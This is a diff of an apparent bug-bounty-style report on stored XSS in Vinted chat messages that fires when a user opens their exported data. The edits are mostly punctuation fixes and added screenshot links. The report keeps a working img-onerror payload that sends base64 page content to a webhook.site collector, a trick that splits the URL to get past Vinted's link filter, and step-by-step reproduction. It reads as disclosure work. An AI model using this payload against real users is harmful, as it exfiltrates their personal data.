@@ -22,7 +22,7 @@ Chat messages sent between users on Vinted are not sanitized when included in th
 
 ## How It Works
 
-When a user sends a chat message containing an HTML/JS payload, Vinted stores it without sanitization. The payload does not execute on the live web UI — it only manifests when either party exports their account data and opens the generated HTML file.
+When a user sends a chat message containing an HTML/JS payload, Vinted stores it without sanitization. The payload does not execute on the live web UI, it only manifests when either party exports their account data and opens the generated HTML file.
 
 Vinted applies a URL-detection filter that replaces patterns like `https://domain/...` with `{link1}`. This filter is trivially bypassed by splitting the URL string:
 
@@ -43,17 +43,19 @@ This bypass confirms the filter is not a real XSS mitigation.
 ```html
 <img src=x onerror="fetch('https:'+'//webhook.site/<ID>/?d='+btoa(document.body.innerText.substring(0,500)))">
 ```
+![Payload enviado en el chat](/Screenshot 2026-10-01 215433.png)
 
-**3.** The message is stored and rendered as plain text in the live chat UI — no execution occurs there.
+**3.** The message is stored and rendered as plain text in the live chat UI, no execution occurs there.
 
 **4.** From the **victim account** (which never wrote anything malicious), go to:  
 *Settings → Privacy → Request data export* → confirm via email → download the ZIP.
+![Carpeta messages en el ZIP](/Screenshot 2026-10-01 214958.png)
 
 **5.** Open the HTML file inside the archive:  
 `file:///.../messages/index.html`
 
 **6.** The browser renders the page, the `<img onerror>` fires, and a `fetch` request reaches the attacker's webhook with the page content base64-encoded in the `d` parameter.
-
+![Alert ejecutado al abrir el HTML](/alert.png)
 ---
 
 ## Evidence
@@ -62,8 +64,10 @@ This bypass confirms the filter is not a real XSS mitigation.
 
 d=TWVzc2FnZXMKTWVzc2FnZSB0aHJlYWRzIHlvdSd2ZS4uLg==
 
+![Request recibido en webhook](/Screenshot 2026-10-01 215639.png)
 
 **Decoded content (real victim account data):**
+![Base64 decodificado — PII exfiltrada](/Screenshot 2026-10-01 194400.png)
 
 Messages
 Message threads you've been part of
@@ -87,7 +91,7 @@ This confirms execution and exfiltration occurred entirely within the **victim's
 - Arbitrary JavaScript execution when the victim opens their own data export.
 - Exfiltration of full PII visible in the export: conversation threads, messages, counterparty usernames, item subjects, dates.
 - Based on other export sections, the same sanitization failure applies to: full name, email, verified phone number, ID verification status, shipping/billing addresses.
-- The attacker only needs to have sent the victim **one chat message** at any point — no malicious link required.
+- The attacker only needs to have sent the victim **one chat message** at any point, no malicious link required.
 
 ### What this does NOT allow (limitations)
 - Does not run on the `vinted.com` domain — executes under `file://` with no session cookies or auth token. Not account takeover.
